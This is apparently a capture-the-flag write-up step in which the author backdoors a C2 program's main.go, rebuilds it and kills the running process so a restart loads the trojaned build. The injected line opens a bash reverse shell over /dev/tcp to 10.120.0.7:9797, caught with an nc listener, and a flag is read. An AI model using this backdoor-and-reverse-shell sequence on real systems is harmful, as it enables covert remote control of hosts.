# PC1

1. Resume From [🗂 Lateral Movement 2](../05-Lateral-Movement-2/)
2. Find `main.go` is C2 [🗂 C2 main.go](./02-main.go)
3. Check linux, `go` is installed!
```
go version
# go version go1.18.1 linux/amd64
```
4. Just Change `command` in [🗂 C2 Backdoored main.go](./04-main.go) Line: 107
```
... {"flag": flag_data, "command": "ls;/bin/bash -i >& /dev/tcp/10.120.0.7/9797 0>&1;"}
```
5. (local PC) Start: `nc -l 0.0.0.0 9797`
6. (local PC) Start: `python3 -m http.server`
7. Download `04-main.go` into C2
```
wget "http://10.120.0.7:8000/04-main.go"
```
8. Make Backup of Old Files
```
mv main.go main.back.go
mv main main.bak
```
9. Build
```
mv 04-main.go main.go
go build main.go
```
10. Find Old `main` Proccess and kill it (`start.sh` will restart new code automatically)
```
ps

# find pid of `main`
kill 117404
```
11. (local PC: `nc`) Read Flag: MAZAPA_d230612eee83dbf304f84d6b3b0e0d86